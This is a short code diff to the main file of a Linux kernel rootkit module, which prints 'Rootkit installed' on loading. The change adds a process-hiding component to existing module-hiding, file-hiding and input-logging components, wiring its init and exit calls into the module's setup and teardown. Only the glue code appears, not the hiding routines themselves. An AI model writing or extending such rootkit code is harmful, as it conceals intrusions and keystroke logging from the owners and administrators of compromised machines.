@@ -9,6 +9,9 @@
 #include "moduleHide.h"
 #include "fileHide.h"
 #include "outputDevice.h"
+#include "processHider.h"
+
+#define DEV_MODE
 
 static int __init main_init(void) {
 	int error;
@@ -29,6 +32,9 @@ static int __init main_init(void) {
 
 	error = fileHide_start();
 	if (error) return error;
+	
+	error = processHider_init();
+	if (error) return error;
 
 	printk(KERN_INFO "Rootkit installed\n");
 	return 0;
@@ -42,6 +48,7 @@ static void __exit main_exit(void) {
 #endif
 	logInput_exit();
 	outputDevice_exit();
+	processHider_exit();
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
 }
